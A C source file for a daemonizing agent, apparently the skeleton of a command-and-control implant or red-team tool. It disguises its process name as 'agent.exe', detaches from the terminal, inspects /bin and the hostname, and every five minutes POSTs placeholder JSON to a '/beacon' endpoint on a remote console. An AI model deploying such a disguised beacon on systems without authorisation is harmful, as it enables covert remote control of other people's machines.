#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include "lib/networking.h"
#include "lib/http.h"
#include "lib/logger.h"
#include "lib/tasking.h"
#include "lib/json.h"

#define MAX_NAME_LENGTH 128

const char DAEMON_NAME[MAX_NAME_LENGTH] = "Daemon: agent.exe";
int alive = 1;

int daemonize(char** argv)
{
    pid_t pid, sid;

    pid = fork();
    if (pid < 0){
        log(ERR, "Failed to fork off a new process.");
        exit(EXIT_FAILURE);
    }
    else if (pid > 0){
        return 1;
    }

    sprintf(argv[0], "%s", DAEMON_NAME);

    umask(0);
    //Should probably open logs here instead of in the separate function and just use the open FD.

    sid = setsid();
    if (sid < 0){
        log(ERR, "Failed to set a new SID for the child process.");
        exit(EXIT_FAILURE);
    }

    if ((chdir("/")) < 0){
        log(ERR, "Failed to change the working directory to root.");
        exit(EXIT_FAILURE);
    }

    log(INFO, "Daemon forked off successfully.");
    if (close(STDIN_FILENO))
    {
        log(ERR, "Failed to close STDIN");
        exit(EXIT_FAILURE);
    }
    if (close(STDOUT_FILENO))
    {
        log(ERR, "Failed to close STDOUT");
        exit(EXIT_FAILURE);
    }
    if (close(STDERR_FILENO))
    {
        log(ERR, "Failed to close STDERR");
        exit(EXIT_FAILURE);
    }

    return 0;
}

int main(int argc, char** argv)
{
    if (argc > 2){
        strncpy(management_console_ip, argv[1], strnlen(argv[1], 19));
        strncpy(management_console_port, argv[2], strnlen(argv[2], 7));
    }
    else{
        strncpy(management_console_ip, MANAGEMENT_CONSOLE_IP, strnlen(MANAGEMENT_CONSOLE_IP, 19));
        strncpy(management_console_port, MANAGEMENT_CONSOLE_PORT, strnlen(MANAGEMENT_CONSOLE_PORT, 7));
    }

    printf("Boy he bout to do it.\n");
    printf("IP: %s\nPort: %s\n", management_console_ip, management_console_port); 
    //Process args before calling daemonize
    if (!ATTACH_DAEMON && daemonize(argv)){
        log(INFO, "Daemon forked off successfully.");
        exit(EXIT_SUCCESS);
    }

    printf("%s\n", "Let's get it started in here!");

    while(alive){
        printf("Test");
        log(DBG, "Waking up...");

        log(INFO, "Starting task...");
        TaskStatus status = doTaskA(PackageQuery, 1, "/bin");
        if (status == ERROR)
        {
            break;
        }

        FILE* cmd = popen("hostname", "r");
        if (cmd == NULL)
        {
            log(ERR, "Unable to determine hostname.");
            break;
        }

        char hostname[64] = { '\0' };

        if ( fread(hostname, sizeof(char), 64, cmd) )
        {
            PHTTP_CLIENT_CTX client_ctx = HTTP_Init_Client_CTX();
            if (client_ctx == NULL)
            {
                log(ERR, "Failed to create and HTTP Client Context");
            }

            // JSON example
            size_t buffSize = 0;
            JSON_OBJECT arr[3], arr_sub[3];

            JSON_Set_Object_String(arr, "object1", "string1");
            JSON_Set_Child_Object(arr + 1, "object2", arr_sub, 3);
            JSON_Set_Object_Number(arr + 2, "object3", "675.56");
            JSON_Set_Object_String(arr_sub, "object4", "string2");
            JSON_Set_Object_String(arr_sub + 1, "object5", "string3");
            JSON_Set_Object_Number(arr_sub + 2, "object6", "545");

            // Get a buffer to the structured JSON content (must pass the root array)
            const char *testbuff = JSON_Get_Structured_Buffer(arr, 3, &buffSize);

            PHTTP_REQUEST request = &client_ctx->Request;

            HTTP_Client_Set_Request_Method(request, HTTP_REQUEST_METHOD_POST);
            HTTP_Client_Set_Request_Address(request, management_console_ip);
            HTTP_Client_Set_Request_Port(request, management_console_port);
            HTTP_Client_Set_Request_Uri(request, "/beacon");
            HTTP_Client_Set_Request_Content_Type(request, HTTP_HEADER_CONTENT_TYPE_JSON);
            HTTP_Client_Set_Request_Content(request, testbuff, buffSize);

            if (HTTP_Client_Send_Request(client_ctx))
            {
                log(ERR, "Sending the HTTP request failed.");
            }

            free((void *)testbuff);
            HTTP_Free_Client_CTX(client_ctx);

        }

        log(DBG, "Nighty night...");
        sleep(300);
    }

    log(INFO, "Shutting down. Go on without me...");
    return EXIT_SUCCESS;
}
